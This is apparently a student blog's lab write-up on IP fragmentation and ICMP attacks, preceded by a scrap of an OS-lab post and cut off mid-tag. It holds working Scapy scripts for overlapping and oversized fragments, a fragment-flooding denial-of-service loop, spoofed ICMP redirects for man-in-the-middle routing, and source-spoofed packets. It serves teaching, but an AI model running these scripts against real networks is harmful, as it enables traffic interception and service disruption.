binary：将要加载的可执行文件的起始位置，type：process类型</p><p>code：</p><pre><code class="hljs reasonml">voidenv<span class="hljs-constructor">_create(<span class="hljs-params">uint8_t</span> <span class="hljs-operator">*</span><span class="hljs-params">binary</span>, <span class="hljs-params">enum</span> EnvType <span class="hljs-params">type</span>)</span>&#123;<span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-comment">// panic("env_create not yet implemented");</span><span class="hljs-keyword">struct</span> Env* e;<span class="hljs-built_in">int</span> r;<span class="hljs-keyword">if</span> ((r = env<span class="hljs-constructor">_alloc(&amp;<span class="hljs-params">e</span>, 0)</span> != <span class="hljs-number">0</span>)) &#123;panic(<span class="hljs-string">"create env failed\n"</span>);&#125;load<span class="hljs-constructor">_icode(<span class="hljs-params">e</span>, <span class="hljs-params">binary</span>)</span>;e-&gt;env_type = <span class="hljs-keyword">type</span>;&#125;</code></pre><p>env_run（）</p><pre><code class="hljs xl">voidenv_run(struct Env *e)&#123;<span class="hljs-function"><span class="hljs-title">if</span> (curenv != NULL &amp;&amp; curenv-&gt;</span>env_status == ENV_RUNNING) &#123;<span class="hljs-function"><span class="hljs-title">curenv</span>-&gt;</span>env_status = ENV_RUNNABLE;&#125;curenv = e;<span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span>env_status = ENV_RUNNING;<span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span>env_runs++;<span class="hljs-function"><span class="hljs-title">lcr3</span>(PADDR(e-&gt;</span>env_pgdir));   <span class="hljs-function"><span class="hljs-title">env_pop_tf</span>(&amp;e-&gt;</span>env_tf);<span class="hljs-comment">// LAB 3: Your code here.</span>panic(<span class="hljs-string">"env_run not yet implemented"</span>);&#125;</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Operating System</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IP/ICMP Attack lab</title>
    <link href="/2020/10/19/IP-ICMP-Attack-lab/"/>
    <url>/2020/10/19/IP-ICMP-Attack-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="IP-ICMP-Attacks-Lab"><a href="#IP-ICMP-Attacks-Lab" class="headerlink" title="IP/ICMP Attacks Lab"></a>IP/ICMP Attacks Lab</h1><h2 id="Tasks-1-IP-分片"><a href="#Tasks-1-IP-分片" class="headerlink" title="Tasks 1: IP 分片"></a>Tasks 1: IP 分片</h2><h3 id="Task-1-a：构造IP分片"><a href="#Task-1-a：构造IP分片" class="headerlink" title="Task 1.a：构造IP分片"></a>Task 1.a：构造IP分片</h3><p>在这里，我们需要构造一个UDP报文，并且将它发给UDP server端</p><p>关于UDP中checksum的一些点</p><blockquote><p>It should be noted that the UDP checksum field needs to be set correctly. （因为UDP并没有一个向TCP一样的MSS来进行限制，所以在计算checksum的时候，其实传递到运输层还是整个数据，所以checksum的计算应该是整个数据包，而不是一个分片上的数据）If we do not set this field, Scapy will calculate the checksum for us, but this checksum will only be based on the data in the first fragment, which is incorrect. If we set the checksum field to zero, Scapy will leave it alone. Moreover, the recipient will not validate the UDP checksum if it sees a zero in the checksum field, because in UDP, checksum validation is optional.</p></blockquote><p>相关代码如下</p><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span><span class="hljs-keyword">from</span> scapy.all import *<span class="hljs-comment"># Construct IP header </span>ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip.id = 1000 # Identification ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip.flags = 1 # Flagsip.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct UDP header </span>udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) udp.len = 104 # This should be the combined length of all fragments<span class="hljs-comment"># Construct payload </span>payload = <span class="hljs-string">'A'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero send(pkt, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip2.id = 1000 # Identification ip2.frag = 5 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip2.flags = 1 # Flagsip2.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload2 = <span class="hljs-string">'B'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt2, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip3.id = 1000 # Identification ip3.frag = 9 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip3.flags = 0 # Flagsip3.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre><p>在client和server端使用wireshark来进行抓包</p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-a-2.PNG" srcset="/img/loading.gif" alt="task1-a-2"></p><p>可以看到此时的分片只有第一个是有UDP报文头部的，而之后的分片是在数据部分直接加上了IP的头部</p><p>此时，对应server端的terminal会显示</p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-a-1.PNG" srcset="/img/loading.gif" alt="task1-a-1"></p><h3 id="Task-1-b：内容重叠的IP分片"><a href="#Task-1-b：内容重叠的IP分片" class="headerlink" title="Task 1.b：内容重叠的IP分片"></a>Task 1.b：内容重叠的IP分片</h3><ol><li><p>第一个和第二个IP分片有K个bytes的重叠部分，在这里每个fragment都还是32bytes，将K设置为了8</p><p> 首先是先发第一个分片，代码如下</p> <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span><span class="hljs-keyword">from</span> scapy.all import *<span class="hljs-comment"># Construct IP header </span>ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip.id = 1000 # Identification ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip.flags = 1 # Flagsip.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct UDP header </span>udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) udp.len = 96 # This should be the combined length of all fragments<span class="hljs-comment"># Construct payload </span>payload = <span class="hljs-string">'A'</span> * 24 + <span class="hljs-string">'D'</span> * 8 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero send(pkt, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip2.id = 1000 # Identification ip2.frag = 4 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip2.flags = 1 # Flagsip2.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload2 =  <span class="hljs-string">'D'</span> * 8  + <span class="hljs-string">'B'</span> * 24 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt2, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip3.id = 1000 # Identification ip3.frag = 8 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip3.flags = 0 # Flagsip3.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre><p> 通过代码可以看到有8byte的“D”在第一第二分片上是重叠的，之后在wireshark能够抓到相应的包</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-2.PNG" srcset="/img/loading.gif" alt="task1-b-2"></p><p> 之后在server端也能够显示</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-1.PNG" srcset="/img/loading.gif" alt="task1-b-1"></p></li><li><p>之后我们尝试先发送第二个IP分片，再来发送第一个IP分片，看在server端如何显示，调整一下上面代码的发包顺序即可</p> <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span><span class="hljs-keyword">from</span> scapy.all import *<span class="hljs-comment"># Construct IP header </span>ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip2.id = 1000 # Identification ip2.frag = 4 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip2.flags = 1 # Flagsip2.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload2 =  <span class="hljs-string">'D'</span> * 8  + <span class="hljs-string">'B'</span> * 24 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt2, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip.id = 1000 # Identification ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip.flags = 1 # Flagsip.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct UDP header </span>udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) udp.len = 96 # This should be the combined length of all fragments<span class="hljs-comment"># Construct payload </span>payload = <span class="hljs-string">'A'</span> * 24 + <span class="hljs-string">'D'</span> * 8 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero send(pkt, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip3.id = 1000 # Identification ip3.frag = 8 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip3.flags = 0 # Flagsip3.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre><p> 在client运行wireshark，发现顺序发生改变</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-3.PNG" srcset="/img/loading.gif" alt="task1-b-3"></p><p> 但是在server的terminal上面依旧会显示</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-4.PNG" srcset="/img/loading.gif" alt="task1-b-4"></p><p> 这是由于在server端会进行重组，最终还原为一个完整的IP数据包再递交给上层协议</p></li><li><p>第二个fragment完全包含在第一个fragment当中，并且按第一个第二个的顺序来发分片</p><p> 在这里我是把第一个分片的data设为了64个“A”，第二个分片是32个”B”，但是偏移量和第一个分片的后32个一样</p> <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span><span class="hljs-keyword">from</span> scapy.all import *<span class="hljs-comment"># Construct IP header </span>ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip.id = 1000 # Identification ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip.flags = 1 # Flagsip.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct UDP header </span>udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) udp.len = 104 # This should be the combined length of all fragments<span class="hljs-comment"># Construct payload </span>payload = <span class="hljs-string">'A'</span> * 64 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero send(pkt, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip2.id = 1000 # Identification ip2.frag = 5 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip2.flags = 1 # Flagsip2.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload2 =  <span class="hljs-string">'B'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt2, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip3.id = 1000 # Identification ip3.frag = 9 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip3.flags = 0 # Flagsip3.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-6.PNG" srcset="/img/loading.gif" alt="task1-b-6"></p><p> 在server显示当中，第一个包完全把第二包覆盖上去了</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-5.PNG" srcset="/img/loading.gif" alt="task1-b-5"></p></li><li><p>之后和上面一样，调转一下顺序即可，代码在上面修改就行</p><p> wireshark抓包顺序的结果发生了改变</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-8.PNG" srcset="/img/loading.gif" alt="task1-b-8"></p><p> 但是在server端的显示是不发生改变的</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-7.PNG" srcset="/img/loading.gif" alt="task1-b-7"></p></li></ol><h3 id="Task-1-c：发送一个很大的数据包"><a href="#Task-1-c：发送一个很大的数据包" class="headerlink" title="Task 1.c：发送一个很大的数据包"></a>Task 1.c：发送一个很大的数据包</h3><p>思路如下，在这里我们只是随便的进行一个构造，但是IP分片加起来的总长度（IP.length）要大于65536，代码如下</p><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span><span class="hljs-keyword">from</span> scapy.all import *<span class="hljs-comment"># Construct IP header </span>ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip.id = 1000 # Identification ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip.flags = 1 # Flagsip.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct UDP header </span>udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) udp.len = 64 # This should be the combined length of all fragments<span class="hljs-comment"># Construct payload </span>payload = <span class="hljs-string">'A'</span> * 64000 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero send(pkt, <span class="hljs-attribute">verbose</span>=0)<span class="hljs-comment"># Construct IP header </span>ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip2.id = 1000 # Identification ip2.frag = 8001 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip2.flags = 1 # Flagsip2.<span class="hljs-attribute">proto</span>=17<span class="hljs-comment"># Construct payload </span>payload2 =  <span class="hljs-string">'B'</span> * 1536 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment<span class="hljs-comment"># Construct the entire packet and send it out </span>pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload <span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>send(pkt2, <span class="hljs-attribute">verbose</span>=0)</code></pre><p>之后在server端观察到的现象是没有字符被打印出来</p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-c-1.PNG" srcset="/img/loading.gif" alt="task1-c-1"></p><p>而用wireshark进行抓包，发现是可以抓到的</p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-c-2.PNG" srcset="/img/loading.gif" alt="task1-c-2"></p><p>推测是由于在server端进行重组的时候发现报文超过IP报文长度限制，没法递交给上一层协议，最后被丢弃</p><h3 id="Task-1-d：发送一个不完整的IP数据包"><a href="#Task-1-d：发送一个不完整的IP数据包" class="headerlink" title="Task 1.d：发送一个不完整的IP数据包"></a>Task 1.d：发送一个不完整的IP数据包</h3><p>关于拒绝服务攻击和IP分片之间的一些关系</p><blockquote><p>. In the attack, Machine A sends a lot of incomplete IP packets to B, i.e., these packets consist of IP fragments, but some fragments are missing. All these incomplete IP packets will stay in the kernel, until they time out. Potentially, this can cause the kernel to commit a lot of kernel memory. In the past, this had resulted in denial-of-service attacks on the server.</p></blockquote><p>思路：在A里面通过循环的方式发送大量的incomplete IP packets来占满kernal</p><p>code</p><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span><span class="hljs-keyword">from</span> scapy.all import *i = 0<span class="hljs-keyword">while</span> i &lt; 1000000 :# Construct<span class="hljs-built_in"> IP </span>header <span class="hljs-built_in">ip </span>= IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)ip.id = i # Identification ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment ip.flags = 1 # Flagsip.<span class="hljs-attribute">proto</span>=17# Construct UDP header udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) udp.len = 104 # This should be the combined length of all fragments# Construct payload payload = <span class="hljs-string">'A'</span> * 64 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment# Construct the entire packet <span class="hljs-keyword">and</span> send it out pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero send(pkt, <span class="hljs-attribute">verbose</span>=0)i = i + 1</code></pre><p>wireshark抓包情况</p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-d-1.PNG" srcset="/img/loading.gif" alt="task1-d-1"></p><p>但是之后等待运行半天，依旧没有实现拒绝服务，运行之前的程序，发现还是能够在terminal上面进行显示，但是当真正把空间占满，应该是不会显示的</p><h2 id="Task-2：ICMP重定向攻击"><a href="#Task-2：ICMP重定向攻击" class="headerlink" title="Task 2：ICMP重定向攻击"></a>Task 2：ICMP重定向攻击</h2><p>理解：ICMP是IP层的一个协议，ICMP 允许主机或路由器报告差错情况和提供异常报告给发送者，以便发送者进行补偿行为。</p><p>参考blog ：<a href="https://blog.csdn.net/weixin_34238633/article/details/92882113?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160319624519724838519364%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160319624519724838519364&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-4-92882113.pc_first_rank_v2_rank_v28&utm_term=icmp%E9%87%8D%E5%AE%9A%E5%90%91%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F&spm=1018.2118.3001.4187" target="_blank" rel="noopener">理解ICMP重定向</a>，<a href="https://blog.51cto.com/sense5/53491" target="_blank" rel="noopener">ICMP协议和类型</a></p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/ICMP-redirect.PNG" srcset="/img/loading.gif" alt="ICMP-redirect"></p><p>code：（10.0.2.4为中间人/VM M，而10.0.2.5为VM A）</p><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all import *ip = IP(src = <span class="hljs-string">"10.0.2.1"</span>, dst = <span class="hljs-string">"10.0.2.5"</span>)icmp = ICMP(type= 5, code= 0)icmp.gw = (<span class="hljs-string">'10.0.2.4'</span>)<span class="hljs-comment"># The enclosed IP packet should be the one that</span><span class="hljs-comment"># triggers the redirect message.</span>ip2 = IP(src = <span class="hljs-string">"10.0.2.5"</span>, dst = <span class="hljs-string">"182.61.200.6"</span>)send(ip/icmp/ip2/UDP());</code></pre><p>首先先伪造最外面的IP头部，src是之前的网关的IP地址，而后面的dst为受害者IP地址，之后就是ICMP redirect报文的头部，其中gw代表应该发往的网关IP地址，在这里是VM M的IP地址，之后就是VM A最开始发送往网关1的报文，正是这个报文的开始导致了后面重定向的需要，在这里作为验证信息出现，之后运行即可</p><p>在wireshark里面的抓包情况</p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/task2-1.PNG" srcset="/img/loading.gif" alt="task2-1"></p><p>之后在VM A上面进行ip route get的验证</p><p><img src="/2020/10/19/IP-ICMP-Attack-lab/task2.PNG" srcset="/img/loading.gif" alt="task2"></p><p>可以看到，现在是通过了主机M</p><ol><li><p>Q：Can you use ICMP redirect attacks to redirect to a remote machine? Namely, the IP address assigned to icmp.gw is a computer not on the local LAN. Please show your experiment result, and explain your observation.</p><p> A：将code改为</p> <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">from</span> scapy.all import *ip = IP(src = <span class="hljs-string">"10.0.2.1"</span>, dst = <span class="hljs-string">"10.0.2.5"</span>)icmp = ICMP(type= 5, code= 0)icmp.gw = (<span class="hljs-string">'103.41.167.234'</span>)<span class="hljs-comment"># The enclosed IP packet should be the one that</span><span class="hljs-comment"># triggers the redirect message.</span>ip2 = IP(src = <span class="hljs-string">"10.0.2.5"</span>, dst = <span class="hljs-string">"182.61.200.6"</span>)send(ip/icmp/ip2/UDP());</code></pre><p> gw里面的IP并不在LAN网络里面，运行后发现，无法重定向到该主机、</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"></p><p> 原因：重定向是为了能够最优化的穿过网络，使得流量能够更快的传递到目的地，参考<a href="https://www.cisco.com/c/zh_cn/support/docs/ios-nx-os-software/nx-os-software/213841-understanding-icmp-redirect-messages.html" target="_blank" rel="noopener">了解ICMP重定向消息</a>，而当gw所指向的目的网关/主机不在lan网络里面，肯定需要先通过我的默认网关之后进行绕行，这不符合重定向的本意</p></li><li><p>不能，将gw改为10.0.2.6，这是一台关机的电脑，运行结果</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p><p> 可以看到仍然是通过了默认网关，原因是，10.0.2.6在关机状态没法进行接受并转发相应IP数据包的功能</p></li></ol><h2 id="Task-3：路由和反向过滤"><a href="#Task-3：路由和反向过滤" class="headerlink" title="Task 3：路由和反向过滤"></a>Task 3：路由和反向过滤</h2><ol><li><p>首先是对于路由表表项的理解，参考blog：</p><p> <a href="https://stackoverflow.com/questions/8599424/understanding-routing-table-entry" target="_blank" rel="noopener">https://stackoverflow.com/questions/8599424/understanding-routing-table-entry</a> </p><p> <a href="https://superuser.com/questions/347240/why-is-192-168-1-0-needed-in-route-table" target="_blank" rel="noopener">https://superuser.com/questions/347240/why-is-192-168-1-0-needed-in-route-table</a></p><p> <a href="https://blog.csdn.net/yueyadao/article/details/86709503?biz_id=102&amp;utm_term=%E8%B7%AF%E7%94%B1%E8%A1%A8%E8%A1%A8%E9%A1%B9&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-86709503&amp;spm=1018.2118.3001.4187" target="_blank" rel="noopener">https://blog.csdn.net/yueyadao/article/details/86709503?biz_id=102&amp;utm_term=%E8%B7%AF%E7%94%B1%E8%A1%A8%E8%A1%A8%E9%A1%B9&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-86709503&amp;spm=1018.2118.3001.4187</a></p><p> 在这里我的R上面的两个IP地址分别为10.0.2.5以及192.168.60.1，但是在A上面默认的发包的网关IP是10.0.2.1，调整表项</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-1.PNG" srcset="/img/loading.gif" alt="task3-1"></p><p> 之后在B上面ping A（10.0.2.4）结果如下</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-2.PNG" srcset="/img/loading.gif" alt="task3-2"></p><p> 在A上面ping B（192.168.60.5）注意路由表表项是有生存时间的</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-3.PNG" srcset="/img/loading.gif" alt="task3-3"></p><p> 在B上面telnet（TCP链接）A</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-5.PNG" srcset="/img/loading.gif" alt="task3-5"></p><p> 反之，在A上面telnet B</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-4.PNG" srcset="/img/loading.gif" alt="task3-4"></p></li><li><p>首先是伪造属于10.0.2.0/24的IP地址，选择10.0.2.6作为src地址</p><p> code如下：</p> <pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-built_in">from</span> scapy.all import *<span class="hljs-keyword">a</span> = IP()<span class="hljs-keyword">a</span>.src = <span class="hljs-string">"10.0.2.6"</span><span class="hljs-keyword">a</span>.dst = <span class="hljs-string">"192.168.60.5"</span>b = ICMP()p = <span class="hljs-keyword">a</span>/b<span class="hljs-built_in">send</span>(p)</code></pre><p> 在R上面运行wireshark观察到的结果</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-6.PNG" srcset="/img/loading.gif" alt="task3-6"></p><p> 在分析是否进行转发到内部网络的时候，可以分析MAC地址，在两个ICMP报文中，可以看到他们的MAC地址发生了改变，第一个包的源MAC是A的MAC地址，但是会发现是no response found，之后紧接着下一个ICMP的报文的源MAC地址就是R上面的接入内部网络的MAC地址，所以会转发到内部网络</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-7.PNG" srcset="/img/loading.gif" alt="task3-7"></p><p> 在这里我们可以看到在内部网络里面的ICMP报文的源MAC地址是R上面其中一个接口的MAC地址</p></li><li><p>在这里我们伪造源IP地址为192.168.60.6，将上面code改一下即可</p><p> 首先来看R的截图</p><p> <img 